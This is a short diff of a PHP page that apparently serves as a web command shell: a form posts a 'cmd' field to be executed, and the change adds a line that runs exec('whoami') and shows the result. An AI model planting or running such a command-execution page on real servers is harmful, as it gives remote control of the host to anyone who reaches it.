@@ -16,6 +16,7 @@ if (isset($_POST['cmd'])) {
 
 ?>
 <hr>
+<h6><?= exec('whoami') ?></h6>
 <form action="/" method="post">
     <input type="text" name="cmd">
     <button type="submit">exec</button>
